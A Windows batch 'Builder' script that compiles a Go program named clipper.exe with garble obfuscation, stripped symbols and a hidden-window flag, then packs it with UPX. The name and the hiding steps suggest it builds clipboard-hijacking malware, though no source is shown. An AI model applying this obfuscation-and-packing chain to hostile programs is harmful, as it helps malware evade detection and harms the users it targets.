@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

cls

echo.
echo    ___      _ _    _         
echo   ^| _ ^)_  _^(_^) ^|__^| ^|___ _ _ 
echo   ^| _ ^\ ^|^| ^| ^| / _` / -_^) '_^|
echo   ^|___^/\_,_^|_^|_\__,_\___^|_^|  
echo.
echo.

echo Installing garble...
go install mvdan.cc/garble@latest
if errorlevel 1 (
    echo Failed to install garble
    pause
    exit /b 1
)

echo Building...
garble -seed=random -tiny build -ldflags="-s -w -H=windowsgui" -o clipper.exe 
if errorlevel 1 (
    echo Failed to build with garble
    echo Trying regular build...
    go build -ldflags="-s -w -H=windowsgui" -o clipper.exe
    if errorlevel 1 (
        echo Build failed
        pause
        exit /b 1
    )
)

if exist "clipper.exe" (
    echo Compressing...
    where upx >nul 2>&1
    if errorlevel 1 (
        echo UPX not found, skipping compression
    ) else (
        upx --best clipper.exe >nul 2>&1
        if errorlevel 1 (
            echo UPX compression failed
        )
    )
    
    echo.
    
    for %%F in ("clipper.exe") do (
        set "size=%%~zF"
        echo File size: ^!size:~0,-6!.!size:~-6,1!MB^
    )
    
    echo.
    echo Success!
) else (
    echo ERROR: clipper.exe was not created!
)

pause